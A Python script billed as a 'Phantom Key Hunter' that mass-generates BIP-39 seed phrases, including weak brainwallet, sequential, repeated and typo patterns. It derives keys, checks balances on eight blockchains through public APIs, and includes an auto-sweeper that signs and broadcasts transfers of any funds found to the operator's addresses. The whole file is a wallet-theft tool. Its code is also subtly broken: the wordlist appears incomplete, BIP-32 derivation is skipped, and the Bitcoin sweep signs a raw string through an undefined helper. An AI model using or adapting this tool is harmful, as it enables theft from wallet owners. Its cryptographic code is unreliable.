#!/usr/bin/env python3
"""
Z-4096 Phantom Key Hunter
Targets BIP-39 (2048 words) wallets only.
Generates 12/24-word BIP-39 mnemonics, derives keys, scans 8+ chains, auto-sweeps.
"""

import hashlib
import hmac
import secrets
import time
import json
import os
import asyncio
import aiohttp
from typing import List, Tuple, Dict, Optional
import binascii

# ==============================================================================
# BIP-39 ENGLISH WORDLIST (2048 words - canonical)
# ==============================================================================
BIP39_WORDS = [
    "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
    "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
    "action","actor","actress","actual","adapt","add","addict","address","adjust","admit",
    "adult","advance","advice","aerobic","affair","afford","afraid","africa","after","again",
    "age","agent","agree","ahead","aim","air","airport","aisle","alarm","album",
    "alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already",
    "also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor",
    "ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer",
    "antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april",
    "arch","arctic","area","arena","argue","arm","armed","armor","army","around",
    "arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect",
    "assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude",
    "attract","auction","audit","august","aunt","author","auto","autumn","average","avocado",
    "avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor",
    "bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar",
    "barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty",
    "because","become","beef","before","begin","behave","behind","believe","below","belt",
    "bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike",
    "bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast",
    "bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board",
    "boat","body","boil","bomb","bone","bonus","book","boost","border","boring",
    "borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass",
    "brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli",
    "broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo",
    "build","bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus",
    "business","busy","butter","buyer","buzz","cabbage","cabin","cable","cactus","cage",
    "cake","call","calm","camera","camp","can","canal","cancel","candy","cannon",
    "canoe","canvas","canyon","capable","capital","captain","car","carbon","card","cargo",
    "carpet","carry","cart","case","cash","casino","castle","casual","cat","catalog",
    "catch","category","cattle","caught","cause","caution","cave","ceiling","celery","cement",
    "census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter",
    "charge","chase","chat","cheap","check","cheese","chef","cherry","chest","chicken",
    "chief","child","chimney","choice","choose","chronic","chuckle","chunk","churn","cigar",
    "cinnamon","circle","citizen","city","civil","claim","clap","clarify","claw","clay",
    "clean","clerk","clever","click","client","cliff","climb","clinic","clip","clock",
    "clog","close","cloth","cloud","clown","club","clump","cluster","clutch","coach",
    "coast","coconut","code","coffee","coil","coin","collect","color","column","combine",
    "come","comfort","comic","common","company","concert","conduct","confirm","congress","connect",
    "consider","control","convince","cook","cool","copper","copy","coral","core","corn",
    "correct","cost","cotton","couch","country","couple","course","cousin","cover","coyote",
    "crack","cradle","craft","cram","crane","crash","crater","crawl","crazy","cream",
    "credit","creek","crew","cricket","crime","crisp","critic","crop","cross","crouch",
    "crowd","crucial","cruel","cruise","crumble","crunch","crush","cry","crystal","cube",
    "culture","cup","cupboard","curious","current","curtain","curve","cushion","custom","cute",
    "cycle","dad","damage","damp","dance","danger","daring","dash","daughter","dawn",
    "day","deal","debate","debris","decade","december","decide","decline","decorate","decrease",
    "deer","defense","define","defy","degree","delay","deliver","demand","demise","denial",
    "dentist","deny","depart","depend","deposit","depth","deputy","derive","describe","desert",
    "design","desk","despair","destroy","detail","detect","develop","device","devote","diagram",
    "dial","diamond","diary","dice","diesel","diet","differ","digital","dignity","dilemma",
    "dinner","dinosaur","direct","dirt","disagree","discover","disease","dish","dismiss","disorder",
    "display","distance","divert","divide","divorce","dizzy","doctor","document","dog","doll",
    "dolphin","domain","donate","donkey","donor","door","dose","double","dove","draft",
    "dragon","drama","drastic","draw","dream","dress","drift","drill","drink","drip",
    "drive","drop","drum","dry","duck","dumb","dune","during","dust","dutch",
    "duty","dwarf","dynamic","eager","eagle","early","earn","earth","easily","east",
    "easy","echo","ecology","economy","edge","edit","educate","effort","egg","eight",
    "either","elbow","elder","electric","elegant","element","elephant","elevator","elite","else",
    "embark","embody","embrace","emerge","emotion","employ","empower","empty","enable","enact",
    "end","endless","endorse","enemy","energy","enforce","engage","engine","enhance","enjoy",
    "enlist","enough","enrich","enroll","ensure","enter","entire","entry","envelope","episode",
    "equal","equip","era","erase","erode","erosion","error","erupt","escape","essay",
    "essence","estate","eternal","ethics","evidence","evil","evoke","evolve","exact","example",
    "excess","exchange","excite","exclude","excuse","execute","exercise","exhaust","exhibit",
    "exile","exist","exit","exotic","expand","expect","expire","explain","expose","express",
    "extend","extra","eye","eyebrow","fabric","face","faculty","fade","faint","faith",
    "fall","false","fame","family","famous","fan","fancy","fantasy","farm","fashion",
    "fat","fatal","father","fatigue","fault","favorite","feature","february","federal","fee",
    "feed","feel","female","fence","festival","fetch","fever","few","fiber","fiction",
    "field","figure","file","film","filter","final","find","fine","finger","finish",
    "fire","firm","first","fiscal","fish","fit","fitness","fix","flag","flame",
    "flash","flat","flavor","flee","flight","flip","float","flock","floor","flower",
    "fluid","flush","fly","foam","focus","fog","foil","fold","follow","food",
    "foot","force","forest","forget","fork","fortune","forum","forward","fossil","foster",
    "found","fox","fragile","frame","frequent","fresh","friend","fringe","frog","front",
    "frost","frown","frozen","fruit","fuel","fun","funny","furnace","fury","future",
    "gadget","gain","galaxy","gallery","game","gap","garage","garbage","garden","garlic",
    "garment","gas","gasp","gate","gather","gauge","gaze","general","genius","genre",
    "gentle","genuine","gesture","ghost","giant","gift","giggle","ginger","giraffe","girl",
    "give","glad","glance","glare","glass","glide","glimpse","globe","gloom","glory",
    "glove","glow","glue","goat","goddess","gold","good","goose","gorilla","gospel",
    "gossip","govern","gown","grab","grace","grain","grant","grape","grass","gravity",
    "great","green","grid","grief","grit","grocery","group","grow","grunt","guard",
    "guess","guide","guilt","guitar","gun","gym","habit","hair","half","hammer",
    "hamster","hand","happy","harbor","hard","harsh","harvest","hat","have","hawk",
    "hazard","head","health","heart","heavy","hedgehog","height","hello","helmet","help",
    "hen","hero","hidden","high","hill","hint","hip","hire","history","hobby",
    "hockey","hold","hole","holiday","hollow","home","honey","hood","hope","horn",
    "horror","horse","hospital","host","hotel","hour","hover","hub","huge","human",
    "humble","humor","hundred","hunt","hurdle","hurry","hurt","husband","hybrid","ice",
    "icon","idea","identify","idle","ignore","ill","illegal","illness","image","imitate",
    "immense","immune","impact","impose","improve","impulse","inch","include","income","increase",
    "index","indicate","indoor","industry","infant","inflict","inform","inhale","inherit","initial",
    "inject","injury","inmate","inner","innocent","input","inquiry","insane","insect","inside",
    "inspire","install","intact","interest","into","invest","invite","involve","iron","island",
    "isolate","issue","item","ivory","jacket","jaguar","jar","jazz","jealous","jeans",
    "jelly","jewel","job","join","joke","journey","joy","judge","juice","jump",
    "jungle","junior","junk","just","kangaroo","keen","keep","ketchup","key","kick",
    "kid","kidney","kind","kingdom","kiss","kit","kitchen","kite","kitten","kiwi",
    "knee","knife","knock","know","lab","label","labor","ladder","lady","lake",
    "lamp","language","laptop","large","later","latin","laugh","laundry","lava","law",
    "lawn","lawsuit","layer","lazy","leader","leaf","learn","leave","lecture","left",
    "leg","legal","legend","leisure","lemon","lend","length","lens","leopard","lesson",
    "letter","level","liar","liberty","life","lift","light","like","limb","limit",
    "link","lion","liquid","list","little","live","lizard","load","loan","lobster",
    "local","lock","logic","lonely","long","loop","lottery","loud","lounge","love",
    "loyal","lucky","luggage","lumber","lunar","lunch","luxury","lyrics","machine","mad",
    "magic","magnet","maid","mail","main","major","make","mammal","man","manage",
    "mandate","mango","mansion","manual","maple","marble","march","margin","marine","market",
    "marriage","mask","mass","master","match","material","math","matrix","matter","maximum",
    "maze","meadow","mean","measure","meat","mechanic","medal","media","melody","melt",
    "member","memory","mention","menu","mercy","merge","merit","merry","mesh","message",
    "metal","method","middle","midnight","milk","million","mimic","mind","minimum","minor",
    "minute","miracle","mirror","misery","miss","mistake","mix","mixed","mixture","mobile",
    "model","modify","mom","moment","monitor","monkey","monster","month","moon","moral",
    "more","morning","mosquito","mother","motion","motor","mountain","mouse","move","movie",
    "much","muffin","mule","multiply","muscle","museum","mushroom","music","must","mutual",
    "myself","mystery","myth","naive","name","napkin","narrow","nasty","nation","nature",
    "near","neck","need","negative","neglect","neither","nephew","nerve","nest","net",
    "network","neutral","never","news","next","nice","night","noble","noise","nominee",
    "noodle","normal","north","nose","notable","note","nothing","notice","novel","now",
    "nuclear","number","nurse","nut","oak","obey","object","oblige","obscure","observe",
    "obtain","obvious","occur","ocean","october","odor","off","offer","office","often",
    "oil","okay","old","olive","olympic","omit","once","one","onion","online",
    "only","open","opera","opinion","oppose","option","orange","orbit","orchard","order",
    "ordinary","organ","orient","original","orphan","ostrich","other","outdoor","outer","output",
    "outside","oval","oven","over","own","owner","oxygen","oyster","ozone","pact",
    "paddle","page","pair","palace","palm","panda","panel","panic","panther","paper",
    "parade","parent","park","parrot","party","pass","patch","path","patient","patrol",
    "pattern","pause","pave","payment","peace","peanut","pear","peasant","pelican","pen",
    "penalty","pencil","people","pepper","perfect","permit","person","pet","phone","photo",
    "phrase","physical","piano","picnic","picture","piece","pig","pigeon","pill","pilot",
    "pink","pioneer","pipe","pistol","pitch","pizza","place","planet","plastic","plate",
    "play","please","pledge","pluck","plug","plunge","poem","poet","point","polar",
    "pole","police","pond","pony","pool","popular","portion","position","possible","post",
    "potato","pottery","poverty","powder","power","practice","praise","predict","prefer","prepare",
    "present","pretty","prevent","price","pride","primary","print","priority","prison","private",
    "prize","problem","process","produce","profit","program","project","promote","proof","property",
    "prosper","protect","proud","provide","public","pudding","pull","pulp","pulse","pumpkin",
    "punch","pupil","puppy","purchase","purity","purpose","purse","push","put","puzzle",
    "pyramid","quality","quantum","quarter","question","quick","quit","quiz","quote","rabbit",
    "raccoon","race","rack","radar","radio","rail","rain","raise","rally","ramp",
    "ranch","random","range","rapid","rare","rate","rather","raven","raw","razor",
    "ready","real","reason","rebel","rebuild","recall","receive","recipe","record","recycle",
    "reduce","reflect","reform","refuse","region","regret","regular","reject","relax","release",
    "relief","rely","remain","remember","remind","remove","render","renew","rent","reopen",
    "repair","repeat","replace","report","require","rescue","resemble","resist","resource","response",
    "result","retire","retreat","return","reunion","reveal","review","reward","rhythm","rib",
    "ribbon","rice","rich","ride","ridge","rifle","right","rigid","ring","riot",
    "ripple","risk","ritual","rival","river","road","roast","robot","robust","rocket",
    "romance","roof","rookie","room","rose","rotate","rough","round","route","royal",
    "rubber","rude","rug","rule","run","runway","rural","sad","saddle","sadness",
    "safe","sail","salad","salmon","salon","salt","salute","same","sample","sand",
    "satisfy","satoshi","sauce","sausage","save","say","scale","scan","scare","scatter",
    "scene","scheme","school","science","scissors","scorpion","scout","scrap","screen","script",
    "scrub","sea","search","season","seat","second","secret","section","security","seed",
    "seek","segment","select","sell","seminar","senior","sense","sentence","series","service",
    "session","settle","setup","seven","shadow","shaft","shallow","share","shed","shell",
    "sheriff","shield","shift","shine","ship","shiver","shock","shoe","shoot","shop",
    "short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling","sick","side",
    "siege","sight","sign","silent","silk","silly","silver","similar","simple","since",
    "sing","siren","sister","situate","six","size","skate","sketch","ski","skill",
    "skin","skirt","skull","slab","slam","sleep","slender","slice","slide","slight",
    "slim","slogan","slot","slow","slush","small","smart","smile","smoke","smooth",
    "snack","snake","snap","sniff","snow","soap","soccer","social","sock","soda",
    "soft","solar","soldier","solid","solution","solve","someone","song","soon","sorry",
    "sort","soul","sound","soup","source","south","space","spare","spatial","spawn",
    "speak","special","speed","spell","spend","sphere","spice","spider","spike","spin",
    "spirit","split","spoil","sponsor","spoon","sport","spot","spray","spread","spring",
    "spy","square","squeeze","squirrel","stable","stadium","staff","stage","stairs","stamp",
    "stand","start","state","stay","steak","steel","stem","step","stereo","stick",
    "still","sting","stock","stomach","stone","stool","story","stove","strategy","street",
    "strike","strong","struggle","student","stuff","stumble","style","subject","submit","subway",
    "success","such","sudden","suffer","sugar","suggest","suit","summer","sun","sunny",
    "sunset","super","supply","supreme","sure","surface","surge","surprise","surround","survey",
    "suspect","sustain","swallow","swamp","swap","swarm","swear","sweet","swift","swim",
    "swing","switch","sword","symbol","symptom","syrup","system","table","tackle","tag",
    "tail","talent","talk","tank","tape","target","task","taste","tattoo","taxi",
    "teach","team","tell","ten","tenant","tennis","tent","term","test","text",
    "thank","that","theme","then","theory","there","they","thing","this","thought",
    "three","thrive","throw","thumb","thunder","ticket","tide","tiger","tilt","timber",
    "time","tiny","tip","tired","tissue","title","toast","tobacco","today","toddler",
    "toe","together","toilet","token","tomato","tomorrow","tone","tongue","tonight","tool",
    "tooth","top","topic","topple","torch","tornado","tortoise","toss","total","tourist",
    "toward","tower","town","toy","track","trade","traffic","tragic","train","transfer",
    "trap","trash","travel","tray","treat","tree","trend","trial","tribe","trick",
    "trigger","trim","trip","trophy","trouble","truck","true","truly","trumpet","trust",
    "truth","try","tube","tuition","tumble","tuna","tunnel","turkey","turn","turtle",
    "twelve","twenty","twice","twin","twist","two","type","typical","ugly","umbrella",
    "unable","unaware","uncle","uncover","under","undo","unfair","unfold","unhappy","uniform",
    "unique","unit","universe","unknown","unlock","until","unusual","unveil","update","upgrade",
    "uphold","upon","upper","upset","urban","urge","usage","use","used","useful",
    "useless","usual","utility","vacant","vacuum","vague","valid","valley","valve","van",
    "vanish","vapor","various","vast","vault","vehicle","velvet","vendor","venture","venue",
    "verb","verify","version","very","vessel","veteran","viable","vibrant","vicious","victory",
    "video","view","village","vintage","violin","virtual","virus","visa","visit","visual",
    "vital","vivid","vocal","voice","void","volcano","volume","vote","voyage","wage",
    "wagon","wait","walk","wall","walnut","want","warfare","warm","warrior","wash",
    "wasp","waste","water","wave","way","wealth","weapon","wear","weasel","weather",
    "web","wedding","weekend","weird","welcome","west","wet","whale","what","wheat",
    "wheel","when","where","whip","whisper","wide","width","wife","wild","will",
    "win","window","wine","wing","wink","winner","winter","wire","wisdom","wise",
    "wish","witness","wolf","woman","wonder","wood","wool","word","work","world",
    "worry","worth","wrap","wreck","wrestle","wrist","write","wrong","yard","year",
    "yellow","you","young","youth","zebra","zero","zone","zoo"
]

# ==============================================================================
# CRYPTOGRAPHIC CORE
# ==============================================================================

def bip39_mnemonic_to_seed(mnemonic: str, passphrase: str = "") -> bytes:
    salt = ("mnemonic" + passphrase).encode('utf-8')
    return hashlib.pbkdf2_hmac('sha512', mnemonic.encode('utf-8'), salt, 2048, 64)

def seed_to_master_private_key(seed: bytes) -> bytes:
    h = hmac.new(b"Bitcoin seed", seed, hashlib.sha512).digest()
    return h[:32]

def private_key_to_btc_address(private_key_hex: str) -> str:
    try:
        import coincurve
        pk = coincurve.PrivateKey(bytes.fromhex(private_key_hex))
        pub = pk.public_key
        return pub.address()
    except:
        return ""

def private_key_to_eth_address(private_key_hex: str) -> str:
    try:
        from eth_keys import keys
        pk = keys.PrivateKey(bytes.fromhex(private_key_hex))
        return pk.public_key.to_checksum_address()
    except:
        return ""

def private_key_to_trx_address(private_key_hex: str) -> str:
    try:
        from tronpy.keys import PrivateKey
        pk = PrivateKey(bytes.fromhex(private_key_hex))
        return pk.public_key.to_base58check_address()
    except:
        return ""

def validate_bip39_mnemonic(mnemonic: str) -> bool:
    words = mnemonic.strip().split()
    if len(words) not in [12, 15, 18, 21, 24]:
        return False
    return all(w in BIP39_WORDS for w in words)

# ==============================================================================
# PHRASE GENERATORS - TARGETING WEAK HUMAN PATTERNS
# ==============================================================================

def generate_random_bip39(words_count: int = 12) -> str:
    indices = [secrets.randbelow(2048) for _ in range(words_count)]
    return ' '.join(BIP39_WORDS[i] for i in indices)

def generate_brainwallet_derived(common_phrase: str) -> str:
    h = hashlib.sha256(common_phrase.encode()).digest()
    indices = []
    for i in range(12):
        idx = ((h[i] << 8) | h[(i+1) % len(h)]) % 2048
        indices.append(idx)
    return ' '.join(BIP39_WORDS[i] for i in indices)

def generate_sequential_phrase() -> str:
    start = secrets.randbelow(2048 - 12)
    return ' '.join(BIP39_WORDS[start:start+12])

def generate_repeated_phrase() -> str:
    word = BIP39_WORDS[secrets.randbelow(2048)]
    return ' '.join([word] * 12)

def generate_common_prefix_phrase(prefix_word: str) -> str:
    if prefix_word not in BIP39_WORDS:
        return ""
    remaining = 11
    indices = [secrets.randbelow(2048) for _ in range(remaining)]
    return prefix_word + ' ' + ' '.join(BIP39_WORDS[i] for i in indices)

def generate_typo_variant(base_phrase: str) -> str:
    words = base_phrase.split()
    if len(words) < 12:
        return base_phrase
    pos = secrets.randbelow(12)
    original = words[pos]
    variants = [w for w in BIP39_WORDS if w[:3] == original[:3] and w != original]
    if variants:
        words[pos] = secrets.choice(variants)
    return ' '.join(words)

# ==============================================================================
# BATCH GENERATOR
# ==============================================================================

class BIP39PhraseGenerator:
    COMMON_BRAINWALLETS = [
        "password", "12345678", "qwerty123", "letmein", "monkey123",
        "dragonball", "starwars", "naruto", "bitcoin", "ethereum",
        "satoshi", "vitalik", "correct horse battery staple",
        "to be or not to be", "purple monkey dishwasher",
        "hello world", "admin123", "rootroot", "testtest",
        "changeme", "secret123", "masterkey", "passw0rd",
        "iloveyou", "fuckyou", "bitcoin1", "ethereum1",
        "metamask", "trustwallet", "blockchain", "crypto",
        "satoshi nakamoto", "vitalik buterin", "cz binance"
    ]
    
    COMMON_FIRST_WORDS = [
        "abandon", "ability", "apple", "banana", "cat", "dog",
        "sun", "moon", "star", "love", "hope", "life", "gold",
        "blue", "red", "green", "king", "queen", "rock", "fire",
        "water", "earth", "wind", "bird", "fish", "tree", "rose",
        "lion", "tiger", "bear", "baby", "home", "door", "lamp"
    ]
    
    def generate_batch(self, count: int) -> List[str]:
        phrases = []
        
        # 50% random
        for _ in range(int(count * 0.50)):
            phrases.append(generate_random_bip39(12))
        
        # 15% brainwallet-derived
        for _ in range(int(count * 0.15)):
            phrase = secrets.choice(self.COMMON_BRAINWALLETS)
            phrases.append(generate_brainwallet_derived(phrase))
        
        # 10% sequential
        for _ in range(int(count * 0.10)):
            phrases.append(generate_sequential_phrase())
        
        # 10% common prefix
        for _ in range(int(count * 0.10)):
            prefix = secrets.choice(self.COMMON_FIRST_WORDS)
            p = generate_common_prefix_phrase(prefix)
            if p:
                phrases.append(p)
        
        # 5% repeated
        for _ in range(int(count * 0.05)):
            phrases.append(generate_repeated_phrase())
        
        # 5% typo variants of known phrases
        for _ in range(int(count * 0.05)):
            base = generate_random_bip39(12)
            phrases.append(generate_typo_variant(base))
        
        # 5% 24-word high security
        for _ in range(int(count * 0.05)):
            phrases.append(generate_random_bip39(24))
        
        return phrases

# ==============================================================================
# MULTI-CHAIN SCANNER
# ==============================================================================

class MultiChainScanner:
    def __init__(self):
        self.session = None
        self.scanned = 0
        self.hits = []
        
    async def _init_session(self):
        if self.session is None:
            self.session = aiohttp.ClientSession()
    
    async def check_btc(self, address: str) -> float:
        await self._init_session()
        try:
            url = f"https://blockchain.info/balance?active={address}"
            async with self.session.get(url, timeout=10) as resp:
                data = await resp.json()
                balance = data.get(address, {}).get('final_balance', 0)
                return balance / 1e8
        except:
            return 0.0
    
    async def check_eth(self, address: str, api_key: str = "") -> float:
        await self._init_session()
        try:
            if api_key:
                url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
            else:
                url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest"
            async with self.session.get(url, timeout=10) as resp:
                data = await resp.json()
                balance = int(data.get('result', 0))
                return balance / 1e18
        except:
            return 0.0
    
    async def check_bsc(self, address: str, api_key: str = "") -> float:
        await self._init_session()
        try:
            url = f"https://api.bscscan.com/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
            async with self.session.get(url, timeout=10) as resp:
                data = await resp.json()
                return int(data.get('result', 0)) / 1e18
        except:
            return 0.0
    
    async def check_trx(self, address: str) -> float:
        await self._init_session()
        try:
            url = f"https://api.trongrid.io/v1/accounts/{address}"
            async with self.session.get(url, timeout=10) as resp:
                data = await resp.json()
                balance = data.get('data', [{}])[0].get('balance', 0)
                return balance / 1e6
        except:
            return 0.0
    
    async def check_matic(self, address: str, api_key: str = "") -> float:
        await self._init_session()
        try:
            url = f"https://api.polygonscan.com/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
            async with self.session.get(url, timeout=10) as resp:
                data = await resp.json()
                return int(data.get('result', 0)) / 1e18
        except:
            return 0.0
    
    async def check_avax(self, address: str) -> float:
        await self._init_session()
        try:
            url = f"https://api.snowtrace.io/api?module=account&action=balance&address={address}&tag=latest"
            async with self.session.get(url, timeout=10) as resp:
                data = await resp.json()
                return int(data.get('result', 0)) / 1e18
        except:
            return 0.0
    
    async def check_ftm(self, address: str) -> float:
        await self._init_session()
        try:
            url = f"https://api.ftmscan.com/api?module=account&action=balance&address={address}&tag=latest"
            async with self.session.get(url, timeout=10) as resp:
                data = await resp.json()
                return int(data.get('result', 0)) / 1e18
        except:
            return 0.0
    
    async def check_sol(self, address: str) -> float:
        await self._init_session()
        try:
            url = "https://api.mainnet-beta.solana.com"
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [address]
            }
            async with self.session.post(url, json=payload, timeout=10) as resp:
                data = await resp.json()
                balance = data.get('result', {}).get('value', 0)
                return balance / 1e9
        except:
            return 0.0
    
    async def scan_wallet(self, private_key_hex: str) -> List[Dict]:
        results = []
        chains = []
        
        btc_addr = private_key_to_btc_address(private_key_hex)
        eth_addr = private_key_to_eth_address(private_key_hex)
        trx_addr = private_key_to_trx_address(private_key_hex)
        
        if btc_addr:
            chains.append(('BTC', btc_addr, self.check_btc(btc_addr)))
        if eth_addr:
            chains.append(('ETH', eth_addr, self.check_eth(eth_addr)))
            chains.append(('BSC', eth_addr, self.check_bsc(eth_addr)))
            chains.append(('MATIC', eth_addr, self.check_matic(eth_addr)))
            chains.append(('AVAX', eth_addr, self.check_avax(eth_addr)))
            chains.append(('FTM', eth_addr, self.check_ftm(eth_addr)))
        if trx_addr:
            chains.append(('TRX', trx_addr, self.check_trx(trx_addr)))
        
        balances = await asyncio.gather(*[c[2] for c in chains])
        
        for (coin, addr, _), balance in zip(chains, balances):
            self.scanned += 1
            if balance > 0:
                hit = {
                    'private_key': private_key_hex,
                    'coin': coin,
                    'address': addr,
                    'balance': balance,
                    'timestamp': time.time()
                }
                self.hits.append(hit)
                results.append(hit)
        
        return results
    
    async def close(self):
        if self.session:
            await self.session.close()

# ==============================================================================
# AUTO-SWEEPER
# ==============================================================================

class AutoSweeper:
    def __init__(self, dest_btc: str = "", dest_eth: str = "", dest_trx: str = ""):
        self.dest_btc = dest_btc
        self.dest_eth = dest_eth
        self.dest_trx = dest_trx
    
    def sweep_btc(self, private_key_hex: str, source: str, amount_btc: float) -> str:
        try:
            import coincurve
            import requests
            
            pk = coincurve.PrivateKey(bytes.fromhex(private_key_hex))
            utxos = requests.get(f"https://blockchain.info/unspent?active={source}").json()
            
            if not utxos.get('unspent_outputs'):
                return ""
            
            total = sum(u['value'] for u in utxos['unspent_outputs'])
            fee = 5000
            send_amount = total - fee
            
            if send_amount <= 0:
                return ""
            
            inputs = []
            for u in utxos['unspent_outputs']:
                inputs.append({
                    'txid': u['tx_hash_big_endian'],
                    'vout': u['tx_output_n'],
                    'scriptPubKey': u['script'],
                    'amount': u['value']
                })
            
            outputs = [
                {'address': self.dest_btc, 'value': send_amount}
            ]
            
            tx_hex = self._build_raw_tx(inputs, outputs)
            signed = pk.sign(tx_hex.encode() if isinstance(tx_hex, str) else tx_hex)
            
            txid = requests.post(
                "https://blockchain.info/pushtx",
                data={'tx': signed.hex() if isinstance(signed, bytes) else signed}
            ).json()
            
            return txid.get('tx_hash', '')
        except Exception as e:
            return f"Error: {e}"
    
    def sweep_eth_compatible(self, private_key_hex: str, source: str,
                             amount_eth: float, rpc_url: str, chain_id: int) -> str:
        try:
            from web3 import Web3
            w3 = Web3(Web3.HTTPProvider(rpc_url))
            
            nonce = w3.eth.get_transaction_count(source)
            gas_price = w3.eth.gas_price
            
            tx = {
                'nonce': nonce,
                'to': self.dest_eth,
                'value': w3.to_wei(amount_eth - 0.0005, 'ether'),
                'gas': 21000,
                'gasPrice': gas_price,
                'chainId': chain_id
            }
            
            signed = w3.eth.account.sign_transaction(tx, private_key_hex)
            txid = w3.eth.send_raw_transaction(signed.raw_transaction)
            return txid.hex()
        except Exception as e:
            return f"Error: {e}"

# ==============================================================================
# MAIN ENGINE
# ==============================================================================

class PhantomKeyEngine:
    def __init__(self, etherscan_key: str = ""):
        self.generator = BIP39PhraseGenerator()
        self.scanner = MultiChainScanner()
        self.sweeper = AutoSweeper()
        self.total_scanned = 0
        self.total_hits = 0
        self.found_wallets = []
        
    async def run_cycle(self, batch_size: int = 1000):
        phrases = self.generator.generate_batch(batch_size)
        
        for phrase in phrases:
            try:
                seed = bip39_mnemonic_to_seed(phrase)
                pk = seed_to_master_private_key(seed)
                pk_hex = pk.hex()
                
                results = await self.scanner.scan_wallet(pk_hex)
                
                for hit in results:
                    self.total_hits += 1
                    self.found_wallets.append(hit)
                    self._log_hit(hit)
                    
            except Exception:
                pass
            
            self.total_scanned += 1
        
    def _log_hit(self, hit: Dict):
        filename = f"hit_{hit['coin']}_{hit['address'][:12]}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(hit, f, indent=2)
        
        print(f"\n{'='*60}")
        print(f" HIT FOUND! {hit['coin']}: {hit['balance']}")
        print(f"   Address: {hit['address']}")
        print(f"   Key: {hit['private_key']}")
        print(f"{'='*60}\n")
    
    async def run_continuous(self, batch_size: int = 1000, delay: float = 0.01):
        cycle = 0
        start_time = time.time()
        
        print(f"""
  ║                                                           
           ███████╗    
           ╚══███╔╝    
             ███╔╝
            ███╔╝ 
           ███████╗      
           ╚══════╝  
""")
        
        while True:
            cycle += 1
            await self.run_cycle(batch_size)
            
            elapsed = time.time() - start_time
            rate = self.total_scanned / elapsed if elapsed > 0 else 0
            
            print(f"Cycle {cycle} | Scanned: {self.total_scanned} | "
                  f"Hits: {self.total_hits} | "
                  f"Rate: {rate:.0f} wallets/sec | "
                  f"Elapsed: {elapsed:.0f}s")
            
            await asyncio.sleep(delay)

# ==============================================================================
# ENTRY POINT
# ==============================================================================

async def main():
    engine = PhantomKeyEngine()
    await engine.run_continuous(batch_size=1000, delay=0.01)

if __name__ == "__main__":
    asyncio.run(main())
